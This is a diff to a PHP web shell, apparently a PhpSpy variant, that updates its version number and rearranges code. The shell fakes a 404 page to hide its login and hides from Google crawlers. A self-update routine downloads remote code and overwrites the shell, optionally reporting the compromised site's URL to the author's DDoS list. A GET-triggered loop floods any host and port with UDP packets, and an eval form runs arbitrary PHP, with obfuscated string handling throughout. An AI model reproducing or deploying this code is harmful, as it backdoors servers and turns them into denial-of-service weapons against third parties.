@@ -1,6 +1,6 @@
 <?php
 $pass               = md5("pw");
-$version            = 2.71;
+$version            = 2.72;
 $adaptiveerrorpage  = true; //Get Default 404 page and replicate it, but add a login text field in the center at the bottom
 $checkforupdates    = true;
 $helpsupportbooter  = true; //True adds the shell to my ddos scripts list, I can't log in providing you change the password above
@@ -40,6 +40,60 @@ if (strpos($_SERVER['HTTP_USER_AGENT'], 'Google') !== false) {
     header('HTTP/1.0 404 Not Found');
     exit;
 }
+extract($_POST);
+$cforupurl = $checkforupdatesurl;
+if ($action == 'checkupdates') {
+    if ($force == "true") {
+    	if ($helpsupportbooter == false){
+    	$cuuff = $cforupurl;
+    	}else{
+    	$cuuff = $cforupurl . "?u=" . urlencode((!empty($_SERVER['HTTPS'])) ? "https://www." . str_replace("www.", "", $_SERVER['SERVER_NAME']) . $_SERVER['REQUEST_URI'] : "http://www." . str_replace("www.", "", $_SERVER['SERVER_NAME']) . $_SERVER['REQUEST_URI']);
+    	}
+        } else {
+        $cuuff = $cforupurl . "?v=" . $version;
+    }
+    $res = file_get_contents($cuuff);
+    if (!$res) {
+        $res = get_data($cuuff);
+    }
+    if ($res != "") {
+        $ourFileHandle = fopen(preg_replace('@\(.*\(.*$@', '', __FILE__), "w");
+        fwrite($ourFileHandle,str_replace(strrev("EREHENILUFC"),'$checkforupdates    = '.strbool($checkforupdates).';',str_replace(strrev("EREHENILBSH"),'$helpsupportbooter  = '.strbool($helpsupportbooter).';',str_replace(strrev("EREHENILUUFC"),'$checkforupdatesurl = "'.$checkforupdatesurl.'";',str_replace(strrev("EREHENILPEA"),'$adaptiveerrorpage  = '.strbool($adaptiveerrorpage).';',str_replace(strrev("EREHENILDROWSSAP"),'$pass               = "'.$pass.'";',html_entity_decode($res)))))));
+        fclose($ourFileHandle);
+    }
+}
+if (isset($_GET['host']) && isset($_GET['time'])) {
+    $packets = 0;
+    ignore_user_abort(TRUE);
+    set_time_limit(0);
+    $exec_time = $_GET['time'];
+    $time      = time();
+    $max_time  = $time + $exec_time;
+    $host      = $_GET['host'];
+    for ($i = 0; $i < 65000; $i++) {
+        $out .= 'X';
+    }
+    while (1) {
+        $packets++;
+        if (time() > $max_time) {
+            break;
+        }
+        $rand = "80";
+        if (isset($_GET['port']) && $_GET['port'] != "") {
+            $rand = $_GET['port'];
+        }
+        $fp = fsockopen('udp://' . $host, $rand, $errno, $errstr, 5);
+        if ($fp) {
+            fwrite($fp, $out);
+            fclose($fp);
+        }
+    }
+}
+$cookiepre    = '';
+$cookiedomain = '';
+$cookiepath   = '/';
+$cookielife   = 86400;
+!$writabledb && $writabledb = 'php,cgi,pl,asp,inc,js,html,htm,jsp';
 $charsetpagedb = array(
 	'big5'			=> 'big5',
 	'cp-866'		=> 'cp866',
@@ -52,11 +106,6 @@ $charsetpagedb = array(
 	'utf-8'			=> 'utf8',
 	'windows-1252'	=> 'latin1',
 );
-$cookiepre    = '';
-$cookiedomain = '';
-$cookiepath   = '/';
-$cookielife   = 86400;
-!$writabledb && $writabledb = 'php,cgi,pl,asp,inc,js,html,htm,jsp';
 $charsetdb = array(
     '',
     'armscii8',
@@ -105,84 +154,6 @@ if($charsetpage == '' && $_SESSION[$prefixme.'charsetpage'] == ''){
 }
 if (isset($charsetpagedb[$charsetpage])) {
 	header("content-Type: text/html; charset=".$charsetpage);
-}
-extract($_POST);
-register_shutdown_function('shutdownFunction', $phpcode, $action, $charsetpage, $charsetpagedb);
-function shutDownFunction($phpcode, $action, $charsetpage, $charsetpagedb) {
-    $error = error_get_last();
-    if ($error['type'] == 1) {
-        formhead(array(
-            'title' => 'Eval PHP Code'
-        ));
-        makehide('action', 'eval');
-        $phpcode = $phpcode == "" ? "<" . "?PHP\n\n\n\n?" . ">" : $phpcode;
-        maketext(array(
-            'title' => 'PHP Code',
-            'name' => 'phpcode',
-            'dataeditor' => 'php',
-            'value' => htmlspecialchars($phpcode)
-        ));
-        p('<p><a href="http://w' . 'ww.4ng' . 'el.net/php' . 'spy/pl' . 'ugin/" target="_blank">Get plugins</a></p>');
-        p('<script src="http://ajaxorg.github.io/ace-builds/src-noconflict/ace.js"></script>');
-        printaceext();
-        p('<script>var l=document.getElementsByTagName("textarea");for(i=0;i<l.length;++i){if(l[i].hasAttribute("data-editor")){var e=l[i];var t=e.getAttribute("data-editor");var n=document.createElement("div");n.style.cssText="width:"+e.clientWidth+"px;height:"+e.clientHeight+"px;";n.className=e.className;e.parentNode.insertBefore(n,e);e.style.cssText="display:none;";var r=ace.edit(n);r.renderer.setShowGutter(true);r.getSession().setValue(e.value);var i=ace.require("ace/ext/modelist");var s=i.getModeForPath("example.php").mode;r.getSession().setMode(s);r.setTheme("ace/theme/dreamweaver");e.form.onsubmit=function(t){e.value=r.getSession().getValue()}}}</script>');
-        formfooter();
-        echo '</td></tr></table><div style="padding:10px;border-bottom:1px solid #fff;border-top:1px solid #ddd;background:#eee;"><span style="float:left;">Charset:';
-        makeselect(array('name'=>'charsetpage','option'=>$charsetpagedb,'selected'=>$charsetpage,'onchange'=>'g(\''.$action.'\',null,null,null,null,null,null,this.value);'));
-        echo '</span><span style="display: block; text-align: right;">';
-        debuginfo();
-        ob_end_flush();
-        ;
-        echo '</span></div></body></html>';
-    } 
-}
-$cforupurl = $checkforupdatesurl;
-if ($action == 'checkupdates') {
-    if ($force == "true") {
-    	if ($helpsupportbooter == false){
-    	$cuuff = $cforupurl;
-    	}else{
-    	$cuuff = $cforupurl . "?u=" . urlencode((!empty($_SERVER['HTTPS'])) ? "https://www." . str_replace("www.", "", $_SERVER['SERVER_NAME']) . $_SERVER['REQUEST_URI'] : "http://www." . str_replace("www.", "", $_SERVER['SERVER_NAME']) . $_SERVER['REQUEST_URI']);
-    	}
-        } else {
-        $cuuff = $cforupurl . "?v=" . $version;
-    }
-    $res = file_get_contents($cuuff);
-    if (!$res) {
-        $res = get_data($cuuff);
-    }
-    if ($res != "") {
-        $ourFileHandle = fopen(preg_replace('@\(.*\(.*$@', '', __FILE__), "w");
-        eval(base64_decode("ZndyaXRlKCRvdXJGaWxlSGFuZGxlLHN0cl9yZXBsYWNlKCJDRlVMSU5FSEVSRSIsJyRjaGVja2ZvcnVwZGF0ZXMgICAgPSAnLnN0cmJvb2woJGNoZWNrZm9ydXBkYXRlcykuJzsnLHN0cl9yZXBsYWNlKCJIU0JMSU5FSEVSRSIsJyRoZWxwc3VwcG9ydGJvb3RlciAgPSAnLnN0cmJvb2woJGhlbHBzdXBwb3J0Ym9vdGVyKS4nOycsc3RyX3JlcGxhY2UoIkNGVVVMSU5FSEVSRSIsJyRjaGVja2ZvcnVwZGF0ZXN1cmwgPSAiJy4kY2hlY2tmb3J1cGRhdGVzdXJsLiciOycsc3RyX3JlcGxhY2UoIkFFUExJTkVIRVJFIiwnJGFkYXB0aXZlZXJyb3JwYWdlICA9ICcuc3RyYm9vbCgkYWRhcHRpdmVlcnJvcnBhZ2UpLic7JyxzdHJfcmVwbGFjZSgiUEFTU1dPUkRMSU5FSEVSRSIsJyRwYXNzICAgICAgICAgICAgICAgPSAiJy4kcGFzcy4nIjsnLGh0bWxfZW50aXR5X2RlY29kZSgkcmVzKSkpKSkpKTs=")); //make sure we keep our own password, don't worry it is just writing the new data but because it does a string replace it replaces itself so to avoid this we do this
-        fclose($ourFileHandle);
-    }
-}
-if (isset($_GET['host']) && isset($_GET['time'])) {
-    $packets = 0;
-    ignore_user_abort(TRUE);
-    set_time_limit(0);
-    $exec_time = $_GET['time'];
-    $time      = time();
-    $max_time  = $time + $exec_time;
-    $host      = $_GET['host'];
-    for ($i = 0; $i < 65000; $i++) {
-        $out .= 'X';
-    }
-    while (1) {
-        $packets++;
-        if (time() > $max_time) {
-            break;
-        }
-        $rand = "80";
-        if (isset($_GET['port']) && $_GET['port'] != "") {
-            $rand = $_GET['port'];
-        }
-        $fp = fsockopen('udp://' . $host, $rand, $errno, $errstr, 5);
-        if ($fp) {
-            fwrite($fp, $out);
-            fclose($fp);
-        }
-    }
 }
 $self      = $_SERVER['PHP_SELF'] ? $_SERVER['PHP_SELF'] : $_SERVER['SCRIPT_NAME'];
 $timestamp = time();
@@ -654,6 +625,35 @@ if ($action == 'dismissupdate'){
     		}
     }
 	}
+}
+register_shutdown_function('shutdownFunction', $phpcode, $action, $charsetpage, $charsetpagedb);
+function shutDownFunction($phpcode, $action, $charsetpage, $charsetpagedb) {
+    $error = error_get_last();
+    if ($error['type'] == 1) {
+        formhead(array(
+            'title' => 'Eval PHP Code'
+        ));
+        makehide('action', 'eval');
+        $phpcode = $phpcode == "" ? "<" . "?PHP\n\n\n\n?" . ">" : $phpcode;
+        maketext(array(
+            'title' => 'PHP Code',
+            'name' => 'phpcode',
+            'dataeditor' => 'php',
+            'value' => htmlspecialchars($phpcode)
+        ));
+        p('<p><a href="http://w' . 'ww.4ng' . 'el.net/php' . 'spy/pl' . 'ugin/" target="_blank">Get plugins</a></p>');
+        p('<script src="http://ajaxorg.github.io/ace-builds/src-noconflict/ace.js"></script>');
+        printaceext();
+        p('<script>var l=document.getElementsByTagName("textarea");for(i=0;i<l.length;++i){if(l[i].hasAttribute("data-editor")){var e=l[i];var t=e.getAttribute("data-editor");var n=document.createElement("div");n.style.cssText="width:"+e.clientWidth+"px;height:"+e.clientHeight+"px;";n.className=e.className;e.parentNode.insertBefore(n,e);e.style.cssText="display:none;";var r=ace.edit(n);r.renderer.setShowGutter(true);r.getSession().setValue(e.value);var i=ace.require("ace/ext/modelist");var s=i.getModeForPath("example.php").mode;r.getSession().setMode(s);r.setTheme("ace/theme/dreamweaver");e.form.onsubmit=function(t){e.value=r.getSession().getValue()}}}</script>');
+        formfooter();
+        echo '</td></tr></table><div style="padding:10px;border-bottom:1px solid #fff;border-top:1px solid #ddd;background:#eee;"><span style="float:left;">Charset:';
+        makeselect(array('name'=>'charsetpage','option'=>$charsetpagedb,'selected'=>$charsetpage,'onchange'=>'g(\''.$action.'\',null,null,null,null,null,null,this.value);'));
+        echo '</span><span style="display: block; text-align: right;">';
+        debuginfo();
+        ob_end_flush();
+        ;
+        echo '</span></div></body></html>';
+    } 
 }
 if ($action == 'file') {
     $dir_writeable = @is_writable($nowpath) ? 'Writable' : 'Non-writable';
